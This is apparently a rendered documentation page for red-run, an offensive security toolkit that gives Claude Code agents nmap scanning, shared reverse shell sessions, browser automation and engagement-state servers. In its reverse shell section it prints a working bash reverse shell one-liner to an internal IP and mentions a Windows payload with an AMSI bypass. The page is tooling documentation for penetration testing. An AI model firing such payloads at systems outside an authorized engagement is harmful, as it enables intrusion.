@@ -1,0 +1,1239 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Offensive security toolkit for Claude Code">
+      
+      
+      
+      
+        <link rel="prev" href="../engagement-state/">
+      
+      
+        <link rel="next" href="../agents/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>MCP Servers - red-run</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#mcp-servers" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="red-run" class="md-header__button md-logo" aria-label="red-run" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            red-run
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              MCP Servers
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/blacklanternsecurity/red-run" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="red-run" class="md-nav__button md-logo" aria-label="red-run" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    red-run
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/blacklanternsecurity/red-run" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../installation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Installation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../running-an-engagement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Running an Engagement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../engagement-state/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Engagement State
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MCP Servers
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MCP Servers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#skill-router" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        skill-router
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nmap-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        nmap-server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        shell-server
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="shell-server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shell-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reverse shell workflow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#platform-auto-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Platform auto-detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-management-endpoints" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session management endpoints
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#docker-mode-privilegedtrue" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Docker mode (privileged=true)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#transcripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Transcripts
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#browser-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        browser-server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#state-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        state-server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-details" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Server details
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../agents/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Agents
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skills-reference/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Skills Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dashboard-and-monitoring/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dashboard & Monitoring
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../writing-skills/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writing Skills
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#skill-router" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        skill-router
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nmap-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        nmap-server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        shell-server
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="shell-server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shell-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reverse shell workflow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#platform-auto-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Platform auto-detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-management-endpoints" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session management endpoints
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#docker-mode-privilegedtrue" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Docker mode (privileged=true)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#transcripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Transcripts
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#browser-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        browser-server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#state-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        state-server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-details" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Server details
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="mcp-servers">MCP Servers</h1>
+<p>red-run uses five MCP (Model Context Protocol) servers to give agents access to capabilities that Claude Code's built-in tools can't provide: network scanning, persistent shell sessions, browser automation, semantic skill search, and engagement state management.</p>
+<p>Most MCP servers run as local stdio processes, started automatically by Claude Code. The exception is <strong>shell-server</strong>, which runs as a persistent SSE service on <code>127.0.0.1:8022</code> so all teammates share the same sessions. <code>run.sh</code> starts shell-server before launching Claude Code.</p>
+<h2 id="configuration">Configuration</h2>
+<p>Servers are configured in <code>.mcp.json</code> at the repo root. Most use stdio transport (command-based), shell-server uses SSE (URL-based):</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;mcpServers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;skill-router&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uv&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;args&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;run&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;--directory&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;tools/skill-router&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;python&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;server.py&quot;</span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;env&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;HF_HUB_OFFLINE&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;nmap-server&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uv&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;args&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;run&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;--directory&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;tools/nmap-server&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;python&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;server.py&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;shell-server&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sse&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;http://127.0.0.1:8022/sse&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;browser-server&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uv&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;args&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;run&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;--directory&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;tools/browser-server&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;python&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;server.py&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;state&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uv&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;args&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;run&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;--directory&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;tools/state-server&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;python&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;server.py&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>All MCP server tools are pre-allowed in <code>.claude/settings.json</code> to reduce permission prompt noise.</p>
+<hr />
+<h2 id="skill-router">skill-router</h2>
+<p><strong>Location:</strong> <code>tools/skill-router/</code> · <strong>3 tools</strong></p>
+<p>Semantic skill discovery and retrieval. Skills are indexed from YAML frontmatter into ChromaDB with <code>all-MiniLM-L6-v2</code> sentence-transformer embeddings. The lead calls <code>search_skills()</code> to find the right skill for a situation, then tells the teammate which skill to load. Teammates call <code>get_skill()</code> to load the full methodology — they never call <code>search_skills()</code> themselves.</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>search_skills(query, n=5, category?, min_similarity=0.4)</code></td>
+<td>Semantic search across all indexed skills</td>
+</tr>
+<tr>
+<td><code>get_skill(name)</code></td>
+<td>Load a skill's full SKILL.md content</td>
+</tr>
+<tr>
+<td><code>list_skills(category?)</code></td>
+<td>List available skills, optionally filtered</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Indexing:</strong> Run <code>uv run --directory tools/skill-router python indexer.py</code> after adding or modifying skills. The indexer extracts description, keywords, tools, and opsec fields from frontmatter and builds embedding documents. ChromaDB data lives at <code>tools/skill-router/.chromadb/</code>.</p>
+<hr />
+<h2 id="nmap-server">nmap-server</h2>
+<p><strong>Location:</strong> <code>tools/nmap-server/</code> · <strong>3 tools</strong> · <strong>Requires Docker</strong></p>
+<p>Runs nmap inside a Docker container with minimal capabilities — no sudo needed. All inputs are validated before reaching <code>subprocess.run()</code>.</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>nmap_scan(target, options="-A -p- -T4", save_to?)</code></td>
+<td>Run nmap in Docker, return parsed JSON</td>
+</tr>
+<tr>
+<td><code>get_scan(scan_id)</code></td>
+<td>Retrieve previous scan results</td>
+</tr>
+<tr>
+<td><code>list_scans()</code></td>
+<td>List all scans from this session</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Container isolation:</strong></p>
+<ul>
+<li><code>--network=host</code> for raw socket access to the target network</li>
+<li><code>--cap-drop=ALL --cap-add=NET_RAW --cap-add=NET_ADMIN</code> — only network capabilities</li>
+<li><code>--rm</code> — container removed after each scan</li>
+<li>No volume mounts — XML output goes to stdout</li>
+</ul>
+<p><strong>Input validation:</strong></p>
+<ul>
+<li>Blocklist of dangerous nmap flags (<code>-iL</code>, <code>-oN</code>, <code>--datadir</code>, etc.)</li>
+<li>Target strings checked for shell metacharacters and path traversal</li>
+<li><code>--script</code> arguments must be bare names (no paths or URLs)</li>
+<li>Evidence paths must be under <code>engagement/evidence/</code></li>
+</ul>
+<p><strong>Output:</strong> Returns structured JSON — hosts, ports, services, banners, NSE script results, OS detection. Raw XML is saved to <code>engagement/evidence/nmap-&lt;target&gt;.xml</code> when the engagement directory exists.</p>
+<table>
+<thead>
+<tr>
+<th>Variable</th>
+<th>Default</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>NMAP_TIMEOUT</code></td>
+<td><code>600</code></td>
+<td>Max scan duration (seconds)</td>
+</tr>
+<tr>
+<td><code>NMAP_DOCKER_IMAGE</code></td>
+<td><code>red-run-nmap:latest</code></td>
+<td>Docker image name</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="shell-server">shell-server</h2>
+<p><strong>Location:</strong> <code>tools/shell-server/</code> · <strong>7 tools</strong> · <strong>SSE transport (shared sessions)</strong></p>
+<p>Manages TCP listeners, reverse shell sessions, and local interactive processes. Runs as a persistent SSE service on <code>127.0.0.1:8022</code> — all teammates share one instance, so sessions created by one teammate are visible to all others. Started automatically by <code>run.sh</code> before Claude Code launches.</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>start_listener(port, host="0.0.0.0", timeout=300, label?)</code></td>
+<td>Start TCP listener, return reverse shell payloads for Linux and Windows</td>
+</tr>
+<tr>
+<td><code>start_process(command, label?, timeout=30, privileged=false)</code></td>
+<td>Spawn local interactive process in a persistent PTY</td>
+</tr>
+<tr>
+<td><code>send_command(session_id, command, timeout=10, expect?)</code></td>
+<td>Send command to session, return output</td>
+</tr>
+<tr>
+<td><code>read_output(session_id, timeout=2)</code></td>
+<td>Read buffered output without sending a command</td>
+</tr>
+<tr>
+<td><code>stabilize_shell(session_id, method="auto")</code></td>
+<td>Upgrade raw shell to interactive PTY (Linux only, skips on Windows)</td>
+</tr>
+<tr>
+<td><code>list_sessions()</code></td>
+<td>List all listeners, sessions, and detected platform</td>
+</tr>
+<tr>
+<td><code>close_session(session_id, save_transcript=true)</code></td>
+<td>Close session and save transcript</td>
+</tr>
+</tbody>
+</table>
+<h3 id="reverse-shell-workflow">Reverse shell workflow</h3>
+<p><code>start_listener</code> returns ready-to-use payloads with the callback IP auto-resolved:</p>
+<div class="highlight"><pre><span></span><code>start_listener(port=4444)  → Returns:
+  payloads.linux:   &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.25/4444 0&gt;&amp;1&quot;
+  payloads.windows: &quot;powershell -c \&quot;Start-Process ... (AMSI bypass + TCP shell)\&quot;&quot;
+</code></pre></div>
+<p>The Windows payload includes an AMSI bypass (for CTF-level Defender) and uses <code>Start-Process</code> to detach from the parent process (survives xp_cmdshell, cmd /c, scheduled tasks).</p>
+<h3 id="platform-auto-detection">Platform auto-detection</h3>
+<p>When a shell connects, the server probes the prompt and auto-detects the platform (Windows/Linux). This determines:
+- <strong>Command separators</strong> — <code>&amp;</code> for Windows cmd.exe, <code>;</code> for Linux
+- <strong>Stabilization</strong> — PTY upgrade on Linux, skipped on Windows
+- <strong>Marker parsing</strong> — handles Windows cmd.exe echoing the wrapped command line</p>
+<h3 id="session-management-endpoints">Session management endpoints</h3>
+<p>Two HTTP endpoints (outside MCP) for <code>run.sh</code> session management:</p>
+<table>
+<thead>
+<tr>
+<th>Endpoint</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GET /status</code></td>
+<td>Returns active session count and details (for startup cleanup prompt)</td>
+</tr>
+<tr>
+<td><code>POST /clear</code></td>
+<td>Closes all sessions and listeners</td>
+</tr>
+</tbody>
+</table>
+<h3 id="docker-mode-privilegedtrue">Docker mode (<code>privileged=true</code>)</h3>
+<p>The <code>privileged</code> parameter runs commands inside the <code>red-run-shell</code> Docker container:</p>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Tools</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Windows access</td>
